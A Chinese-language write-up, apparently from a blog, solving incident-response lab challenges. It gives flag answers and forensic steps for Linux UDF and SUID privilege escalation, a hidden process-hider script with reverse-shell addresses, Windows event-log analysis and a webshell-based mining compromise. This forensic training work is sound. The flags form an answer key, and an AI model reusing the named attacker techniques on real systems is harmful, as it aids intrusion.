            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529114628631.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529114628631.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529114628631.png?imageSlim 2x"
            sizes="auto"
            alt="image-20240529114628631">
    </a></figure></p>
<p>2.黑客反弹shell的ip flag{ip}</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flag{192.168.100.13}
</span></span></code></pre></td></tr></table>
</div>
</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529114818725.png?imageSlim" title="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529114818725.png?imageSlim" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529114818725.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529114818725.png?imageSlim"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529114818725.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529114818725.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529114818725.png?imageSlim 2x"
            sizes="auto"
            alt="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529114818725.png?imageSlim">
    </a></figure></p>
<p>可以发现执行了/tmp目录下的1.sh</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cat /tmp/1.sh
</span></span></code></pre></td></tr></table>
</div>
</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529114920063.png?imageSlim" title="image-20240529114920063" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529114920063.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529114920063.png?imageSlim"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529114920063.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529114920063.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529114920063.png?imageSlim 2x"
            sizes="auto"
            alt="image-20240529114920063">
    </a></figure></p>
<p>3.黑客提权文件的完整路径 md5 flag{md5} 注 /xxx/xxx/xxx/xxx/xxx.xx</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flag{b1818bde4e310f3d23f1005185b973e7}
</span></span></code></pre></td></tr></table>
</div>
</div><p>mysql数据库，猜测是udf提权</p>
<p>查到数据库密码</p>
<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529115056456.png?imageSlim" title="image-20240529115056456" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529115056456.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529115056456.png?imageSlim"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529115056456.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529115056456.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529115056456.png?imageSlim 2x"
            sizes="auto"
            alt="image-20240529115056456">
    </a></figure></p>
<p>登录数据库</p>
<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529115141995.png?imageSlim" title="image-20240529115141995" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529115141995.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529115141995.png?imageSlim"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529115141995.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529115141995.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529115141995.png?imageSlim 2x"
            sizes="auto"
            alt="image-20240529115141995">
    </a></figure></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/usr/lib/mysql/plugin/udf.so
</span></span><span class="line"><span class="cl">计算md5即可
</span></span></code></pre></td></tr></table>
</div>
</div><p>4.黑客获取的权限 flag{whoami后的值}</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flag{mysql}
</span></span></code></pre></td></tr></table>
</div>
</div><p>udf提权拿到的是mysql权限</p>
<h2 id="第三章-权限维持-linux权限维持-隐藏" class="headerLink">
    <a href="#%e7%ac%ac%e4%b8%89%e7%ab%a0-%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81-linux%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81-%e9%9a%90%e8%97%8f" class="header-mark"></a>第三章 权限维持-Linux权限维持-隐藏</h2><p>1.黑客隐藏的隐藏的文件 完整路径md5</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flag{109ccb5768c70638e24fb46ee7957e37}
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">find / -type f -name &#34;.*&#34; 2&gt;/dev/null | grep -v &#34;^\/sys\/&#34; // 查找隐藏文件
</span></span><span class="line"><span class="cl">find / -type d -name &#34;.*&#34; 2&gt;/dev/null // 查找隐藏目录
</span></span></code></pre></td></tr></table>
</div>
</div><p>可疑目录</p>
<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530155011058.png?imageSlim" title="image-20240530155011058" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530155011058.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530155011058.png?imageSlim"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530155011058.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530155011058.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530155011058.png?imageSlim 2x"
            sizes="auto"
            alt="image-20240530155011058">
    </a></figure></p>
<p>隐藏了1.py</p>
<p>md5(/tmp/.temp/libprocesshider/1.py)</p>
<p>2.黑客隐藏的文件反弹shell的ip+端口 {ip:port}</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flag{114.114.114.121:9999}
</span></span></code></pre></td></tr></table>
</div>
</div><p>查看1.py</p>
<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530155548113.png?imageSlim" title="image-20240530155548113" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530155548113.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530155548113.png?imageSlim"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530155548113.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530155548113.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530155548113.png?imageSlim 2x"
            sizes="auto"
            alt="image-20240530155548113">
    </a></figure></p>
<p>3.黑客提权所用的命令 完整路径的md5 flag{md5}</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flag{7fd5884f493f4aaf96abee286ee04120}
</span></span></code></pre></td></tr></table>
</div>
</div><p>查找设置了suid权限的程序</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">find / -type f -perm -4000 2&gt;/dev/null
</span></span></code></pre></td></tr></table>
</div>
</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530155855769.png?imageSlim" title="image-20240530155855769" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530155855769.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530155855769.png?imageSlim"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530155855769.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530155855769.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530155855769.png?imageSlim 2x"
            sizes="auto"
            alt="image-20240530155855769">
    </a></figure></p>
<p>切换到ctf用户验证</p>
<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530160503694.png?imageSlim" title="image-20240530160503694" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530160503694.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530160503694.png?imageSlim"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530160503694.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530160503694.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530160503694.png?imageSlim 2x"
            sizes="auto"
            alt="image-20240530160503694">
    </a></figure></p>
<p>find命令路径</p>
<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530160544231.png?imageSlim" title="image-20240530160544231" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530160544231.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530160544231.png?imageSlim"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530160544231.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530160544231.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530160544231.png?imageSlim 2x"
            sizes="auto"
            alt="image-20240530160544231">
    </a></figure></p>
<p>4.黑客尝试注入恶意代码的工具完整路径md5</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flag{087c267368ece4fcf422ff733b51aed9}
</span></span></code></pre></td></tr></table>
</div>
</div><p>查找隐藏目录</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/home/ctf# find / -type d -name &#34;.*&#34; 2&gt;/dev/null
</span></span></code></pre></td></tr></table>
</div>
</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530160732803.png?imageSlim" title="image-20240530160732803" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530160732803.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530160732803.png?imageSlim"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530160732803.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530160732803.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530160732803.png?imageSlim 2x"
            sizes="auto"
            alt="image-20240530160732803">
    </a></figure></p>
<p>注入工具</p>
<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530160823387.png?imageSlim" title="image-20240530160823387" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530160823387.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530160823387.png?imageSlim"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530160823387.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530160823387.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530160823387.png?imageSlim 2x"
            sizes="auto"
            alt="image-20240530160823387">
    </a></figure></p>
<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530160929682.png?imageSlim" title="image-20240530160929682" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530160929682.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530160929682.png?imageSlim"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530160929682.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530160929682.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530160929682.png?imageSlim 2x"
            sizes="auto"
            alt="image-20240530160929682">
    </a></figure></p>
<p>md5(/opt/.cymothoa-1-beta/cymothoa)</p>
<p>5.使用命令运行 ./x.xx 执行该文件 将查询的 Exec****** 值 作为flag提交 flag{/xxx/xxx/xxx}</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flag{/usr/bin/python3.4}
</span></span></code></pre></td></tr></table>
</div>
</div><p>执行</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python3 /tmp/.temp/libprocesshider/1.py
</span></span></code></pre></td></tr></table>
</div>
</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530161632044.png?imageSlim" title="image-20240530161632044" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530161632044.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530161632044.png?imageSlim"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530161632044.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530161632044.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530161632044.png?imageSlim 2x"
            sizes="auto"
            alt="image-20240530161632044">
    </a></figure></p>
<p>随后进入<code>/proc/9197/</code>，<code>cat cmdline</code></p>
<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530161757678.png?imageSlim" title="image-20240530161757678" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530161757678.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530161757678.png?imageSlim"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530161757678.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530161757678.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530161757678.png?imageSlim 2x"
            sizes="auto"
            alt="image-20240530161757678">
    </a></figure></p>
<h2 id="第五章-windows实战-evtx日志文件分析" class="headerLink">
    <a href="#%e7%ac%ac%e4%ba%94%e7%ab%a0-windows%e5%ae%9e%e6%88%98-evtx%e6%97%a5%e5%bf%97%e6%96%87%e4%bb%b6%e5%88%86%e6%9e%90" class="header-mark"></a>第五章 Windows实战-evtx日志文件分析</h2><p>步骤1.将黑客成功登录系统所使用的IP地址作为Flag值提交；</p>
<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240512193018370.png?imageSlim" title="image-20240512193018370" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240512193018370.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240512193018370.png?imageSlim"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240512193018370.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240512193018370.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240512193018370.png?imageSlim 2x"
            sizes="auto"
            alt="image-20240512193018370">
    </a></figure></p>
<p>安全日志事件ID4625，flag{192.168.36.133}</p>
<p>步骤2.黑客成功登录系统后修改了登录用户的用户名，将修改后的用户名作为Flag值提交；</p>
<p>安全日志事件ID4781，flag{Adnimistartro}</p>
<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240512194150801.png?imageSlim" title="image-20240512194150801" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240512194150801.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240512194150801.png?imageSlim"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240512194150801.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240512194150801.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240512194150801.png?imageSlim 2x"
            sizes="auto"
            alt="image-20240512194150801">
    </a></figure></p>
<p>步骤3.黑客成功登录系统后成功访问了一个关键位置的文件，将该文件名称（文件名称不包含后缀）作为Flag值提交；</p>
<p>安全日志事件ID4663，flag{SCHEMA}</p>
<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240512194646087.png?imageSlim" title="image-20240512194646087" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240512194646087.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240512194646087.png?imageSlim"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240512194646087.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240512194646087.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240512194646087.png?imageSlim 2x"
            sizes="auto"
            alt="image-20240512194646087">
    </a></figure></p>
<p>步骤4.黑客成功登录系统后重启过几次数据库服务，将最后一次重启数据库服务后数据库服务的进程ID号作为Flag值提交；</p>
<p>应用程序日志，source为MySql，flag{8820}</p>
<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240512195751232.png?imageSlim" title="image-20240512195751232" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240512195751232.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240512195751232.png?imageSlim"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240512195751232.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240512195751232.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240512195751232.png?imageSlim 2x"
            sizes="auto"
            alt="image-20240512195751232">
    </a></figure></p>
<p>步骤5.黑客成功登录系统后修改了登录用户的用户名并对系统执行了多次重启操作，将黑客使用修改后的用户重启系统的次数作为Flag值提交。</p>
<p>在系统日志中，事件ID1074，共有3对记录，flag{3}</p>
<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240512201419723.png?imageSlim" title="image-20240512201419723" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240512201419723.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240512201419723.png?imageSlim"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240512201419723.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240512201419723.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240512201419723.png?imageSlim 2x"
            sizes="auto"
            alt="image-20240512201419723">
    </a></figure></p>
<h2 id="第五章-linux实战-挖矿" class="headerLink">
    <a href="#%e7%ac%ac%e4%ba%94%e7%ab%a0-linux%e5%ae%9e%e6%88%98-%e6%8c%96%e7%9f%bf" class="header-mark"></a>第五章 Linux实战-挖矿</h2><p>1.黑客的IP是？ flag格式：flag{黑客的ip地址}，如：flag{127.0.0.1}在</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flag{192.168.10.135}
</span></span></code></pre></td></tr></table>
</div>
</div><p>在/www/admin/websec_80/log/nginx_access_2023-12-22.log中可查看</p>
<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530162911771.png?imageSlim" title="image-20240530162911771" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530162911771.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530162911771.png?imageSlim"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530162911771.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530162911771.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530162911771.png?imageSlim 2x"
            sizes="auto"
            alt="image-20240530162911771">
    </a></figure></p>
<p>2.黑客攻陷网站的具体时间是？ flag格式：flag{年-月-日 时:分:秒}，如：flag{2023-12-24 22:23:24}</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flag{2023-12-22 19:08:34}
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cat nginx_access_2023-12-22.log | grep 200
</span></span></code></pre></td></tr></table>
</div>
</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530163203613.png?imageSlim" title="image-20240530163203613" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530163203613.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530163203613.png?imageSlim"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530163203613.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530163203613.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530163203613.png?imageSlim 2x"
            sizes="auto"
            alt="image-20240530163203613">
    </a></figure></p>
<p>访问了/dede路径</p>
<p>后台地址：/dede 账号：admin 密码：12345678</p>
<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530163640930.png?imageSlim" title="image-20240530163640930" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530163640930.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530163640930.png?imageSlim"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530163640930.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530163640930.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530163640930.png?imageSlim 2x"
            sizes="auto"
            alt="image-20240530163640930">
    </a></figure></p>
<p>3.黑客上传webshell的名称及密码是？ flag格式：flag{黑客上传的webshell名称-webshell密码}，如：flag{webshell.php-pass}</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flag{404.php-cmd}
</span></span></code></pre></td></tr></table>
</div>
</div><p>将Linux的存储映射到本地，然后用d盾进行扫描</p>
<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530164123769.png?imageSlim" title="image-20240530164123769" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530164123769.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530164123769.png?imageSlim"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530164123769.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530164123769.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530164123769.png?imageSlim 2x"
            sizes="auto"
            alt="image-20240530164123769">
    </a></figure></p>
<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530164153083.png?imageSlim" title="image-20240530164153083" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530164153083.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530164153083.png?imageSlim"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530164153083.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530164153083.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530164153083.png?imageSlim 2x"
            sizes="auto"
            alt="image-20240530164153083">
    </a></figure></p>
<p>解码得到密码为cmd</p>
<p>4.黑客提权后设置的后门文件名称是？ flag格式：flag{后门文件绝对路径加上名称}，如：flag{/etc/passwd}</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flag{/usr/bin/find}
</span></span></code></pre></td></tr></table>
</div>
</div><p>history，发现赋予find命令suid权限（4775或u+s）</p>
<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530164533747.png?imageSlim" title="image-20240530164533747" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530164533747.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530164533747.png?imageSlim"
